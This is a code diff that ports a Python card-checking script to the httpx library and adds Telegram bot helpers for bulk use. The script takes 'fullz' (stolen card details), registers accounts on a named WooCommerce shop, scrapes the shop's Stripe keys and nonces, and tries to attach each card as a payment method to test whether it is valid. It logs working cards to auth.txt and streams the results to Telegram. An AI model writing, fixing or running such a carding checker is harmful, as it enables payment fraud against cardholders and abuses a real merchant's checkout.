@@ -1,15 +1,10 @@
-import base64
-import aiohttp
+import httpx
 import random
 import time
 import json
-import uuid
 import asyncio
-from fake_useragent import UserAgent
-import requests
-from defs import *
-import re
 from html import unescape
+from defs import *  # your existing defs functions
 
 def gets(s, start, end):
     try:
@@ -42,10 +37,10 @@ async def create_payment_method(fullz, session):
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        async with session.get('https://christianapostles.com/my-account/', headers=headers) as response:
-            response_text = await response.text()
+        response = await session.get('https://christianapostles.com/my-account/', headers=headers)
 
-        register = gets(response_text, '"woocommerce-register-nonce" value="', '" />')
+        register = gets(response.text, '"woocommerce-register-nonce" value="', '" />')
+        #print(register)
 
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -91,7 +86,7 @@ async def create_payment_method(fullz, session):
             'register': 'Register',
         }
 
-        await session.post('https://christianapostles.com/my-account/', headers=headers, data=data)
+        response = await session.post('https://christianapostles.com/my-account/', headers=headers, data=data)
 
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -110,7 +105,7 @@ async def create_payment_method(fullz, session):
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        await session.get('https://christianapostles.com/my-account/', headers=headers)
+        response = await session.get('https://christianapostles.com/my-account/', headers=headers)
 
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -128,7 +123,7 @@ async def create_payment_method(fullz, session):
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        await session.get('https://christianapostles.com/my-account/payment-methods/', headers=headers)
+        response = await session.get('https://christianapostles.com/my-account/payment-methods/', headers=headers)
 
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -146,12 +141,16 @@ async def create_payment_method(fullz, session):
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        async with session.get('https://christianapostles.com/my-account/add-payment-method/', headers=headers) as response:
-            response_text = await response.text()
+        response = await session.get('https://christianapostles.com/my-account/add-payment-method/', headers=headers)
 
-        pk = gets(response_text, '"publishableKey":"', '"')
-        acc = gets(response_text, '"accountId":"', '"')
-        nonce = gets(response_text, '"createSetupIntentNonce":"', '"')
+        pk = gets(response.text, '"publishableKey":"', '"')
+        #print(pk)
+
+        acc = gets(response.text, '"accountId":"', '"')
+        #print(acc)
+
+        nonce = gets(response.text, '"createSetupIntentNonce":"', '"')
+        #print(nonce)
 
         headers = {
             'accept': 'application/json',
@@ -196,13 +195,13 @@ async def create_payment_method(fullz, session):
             '_stripe_account': acc,
         }
 
-        async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data) as response:
-            response_json = await response.json()
+        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
         try:
-            id = response_json['id']
+            id = response.json()['id']
+            #print(id)
         except Exception:
-            return str(response_json)
+            return response.text
 
         headers = {
             'accept': '*/*',
@@ -220,15 +219,66 @@ async def create_payment_method(fullz, session):
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        form_data = aiohttp.FormData()
-        form_data.add_field('action', 'create_setup_intent')
-        form_data.add_field('wcpay-payment-method', id)
-        form_data.add_field('_ajax_nonce', nonce)
+        files = {
+            'action': (None, 'create_setup_intent'),
+            'wcpay-payment-method': (None, id),
+            '_ajax_nonce': (None, nonce),
+        }
 
-        async with session.post('https://christianapostles.com/wp-admin/admin-ajax.php', headers=headers, data=form_data) as response:
-            response_text = await response.text()
+        response = await session.post('https://christianapostles.com/wp-admin/admin-ajax.php', headers=headers, files=files)
 
-        return response_text
+        return response.text
 
     except Exception as e:
         return str(e)
+
+
+async def multi_checking(fullz):
+    start = time.time()
+    async with httpx.AsyncClient(timeout=40) as session:
+        result = await create_payment_method(fullz, session)
+        response = await charge_resp(result)
+    elapsed = round(time.time() - start, 2)
+
+    # Try to extract a clean error message
+    error_message = ""
+    try:
+        json_resp = json.loads(result)
+        if "data" in json_resp and "error" in json_resp["data"]:
+            msg = unescape(json_resp["data"]["error"].get("message","Error")).strip()
+            if msg.startswith("Error: "):
+                error_message = msg[len("Error: "):].strip()
+            else:
+                error_message = msg
+    except:
+        pass
+
+    if error_message:
+        resp = f"{fullz} {error_message} ❌ Taken {elapsed}s"
+    else:
+        resp = f"{fullz} {response} Taken {elapsed}s"
+        if any(x in response for x in ["Payment method successfully added ✅","CVV INCORRECT ❎","CVV MATCH ✅","INSUFFICIENT FUNDS ✅"]):
+            with open("auth.txt","a",encoding="utf-8") as f:
+                f.write(resp+"\n")
+    return resp
+
+# -------------------------
+# Telegram Bot Helpers
+# -------------------------
+
+def run_chk(fullz):
+    """Check a single card and return result"""
+    return asyncio.run(multi_checking(fullz))
+
+async def run_mchk_async(cc_list, send_message_func):
+    """Check multiple cards and stream results via Telegram"""
+    for card in cc_list:
+        card = card.strip()
+        if not card:
+            continue
+        resp = await multi_checking(card)
+        await send_message_func(resp)
+
+def run_mchk(cc_list, send_message_func):
+    """Sync wrapper for run_mchk_async"""
+    asyncio.run(run_mchk_async(cc_list, send_message_func))
